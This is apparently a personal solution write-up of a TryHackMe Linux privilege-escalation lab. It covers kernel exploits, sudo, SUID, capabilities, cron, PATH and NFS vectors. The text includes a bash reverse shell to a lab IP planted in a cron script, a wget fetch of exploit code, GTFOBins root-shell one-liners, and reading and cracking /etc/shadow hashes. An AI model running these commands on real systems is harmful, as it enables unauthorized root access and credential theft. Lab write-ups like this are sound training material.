https://tryhackme.com/room/linprivesc

# Introduction

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.


# What is Privilege Escalation?

Privilege Escalation usually involves going from a lower permission account to a higher permission one. 

It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

- Resetting passwords
- Bypassing access controls to compromise protected data
- Editing software configurations
- Enabling persistence
- Changing the privilege of existing (or new) users
- Execute any administrative command

# Enumeration

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.


## Important commands/files

hostname
uname -a
/proc/version
/etc/issue
ps
env
sudo -l
id
/etc/passwd
/etc/shadow
history
ifconfig
find 
netstat
getcap
/etc/crontab
.
.
.




# Automated Enumeration Tools

- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)
- [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- [Linux Priv Checker](https://github.com/linted/linuxprivchecker)

# Privilege Escalation: Kernel Exploits

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.


The Kernel exploit methodology is simple;

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

So here is what I did:
1. I found [this](https://www.exploit-db.com/exploits/37292)
2. I ran http.server using python3
3. Then wget it from my server using: `wget http://10.8.89.154:8000/privesc.c -P /tmp`
4. Then i compiled it and ran -> gave root access
5. There is a flag.txt in /home/matt


# Privilege Escalation: Sudo

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the sudo -l command.

1. sudo -l
2. sudo find . -exec /bin/sh \; -quit // (using [this](https://gtfobins.github.io/gtfobins/find/))
3. cat /etc/shadow


# Privilege Escalation: SUID

By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

`find / -type f -perm -04000 -ls 2>/dev/null` -> will list files that have SUID or SGID bits set.
`find / -perm -u=s -type f 2>/dev/null`
use [this](https://gtfobins.github.io/#+suid) prefiltered list to compare

1. `find / -perm -u=s -type f 2>/dev/null`
2. cat /etc/passwd -> gerryconway, user2 ...
3.  
```
$LFILE=/etc/shadow
$ base64 "$LFILE" | base64 --decode
got user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
```

4. using john:
```
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt user2.txt
Created directory: /home/kali/.john
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (?) 
```

5. 
```
$ LFILE=/home/ubuntu/flag3.txt
$ base64 "$LFILE" | base64 --decode
```





# Privilege Escalation: Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.


We can use the getcap tool to list enabled capabilities. When run as an unprivileged user, getcap -r / will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.



getcap -r / 2>/dev/null
`vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`
There is a flag4.txt in /home/ubuntu



# Privilege Escalation: Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.

Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab

Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:

- System administrators need to run a script at regular intervals.
- They create a cron job to do this
- After a while, the script becomes useless, and they delete it
- They do not clean the relevant cron job

***

1. cat /etc/crontab - 4 jobs
2. nano backup.sh ==> bash -i >& /dev/tcp/10.8.89.154/1234 0>&1
3. chmod +x backup.sh ==> got root
4. flag5.txt is in /home/ubuntu
5. cat /etc/shadow -> to john -> got password

# Privilege Escalation: PATH

If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable we're talking about here, path is the location of a file).

A simple search for writable folders can done using the `find / -writable 2>/dev/null` command. The output of this command can be cleaned using a simple cut and sort sequence.

An alternative could be the command below.

`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`

We have added “grep -v proc” to get rid of the many results related to running processes.

The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the `export PATH=/tmp:$PATH` command accomplishes this.

At this point the path script will also look under the /tmp folder for an executable named “thm”.
Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.


We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.

1. using `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` found out that /home/murdoch is writeable
2. there is test and tmp.py in /home/murdoch. My guess is that test will execute tmp.py that will execute tmp program from PATH
3. 

```
$ export PATH=/tmp:$PATH
$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
$ cd /tmp
$ ls
snap.lxd
systemd-private-1adb6d0aa79b40d0969dcd95f7c79411-systemd-logind.service-I9jSni
systemd-private-1adb6d0aa79b40d0969dcd95f7c79411-systemd-resolved.service-ybX0Ze
systemd-private-1adb6d0aa79b40d0969dcd95f7c79411-systemd-timesyncd.service-AKJb5i
$ echo "/bin/bash" > thm
$ chmod 777 thm
$ /home/murdoch/test
root@ip-10-10-64-150:/tmp#
```

4. cat /home/matt/flag6.txt


# Privilege Escalation: NFS

Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

The critical element for this privilege escalation vector is the “no_root_squash” option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.


1. showmount -e 10.10.176.0 -> 3 shared folders
2. mounted on the target sharedfolder
3. created nfs.c that sets uid and gid to 0 and exectes /bin/bash
4. compile it and run it on the target system
5. got root


# Capstone Challenge


1. lets start by SUID with `find / -perm -u=s -type f 2>/dev/null`
2. there is bas64 again
3. 
```
$ LFILE=rileToRead
$ base64 "$LFILE" | base64 --decode
```

4. had to use john on /etc/shadow for missy password to get the first flag /home/missy/Documents/flag1.txt
5. sudo -l on missy gives find as result
6. gtfobins -> find for sudo -> gets root


Done!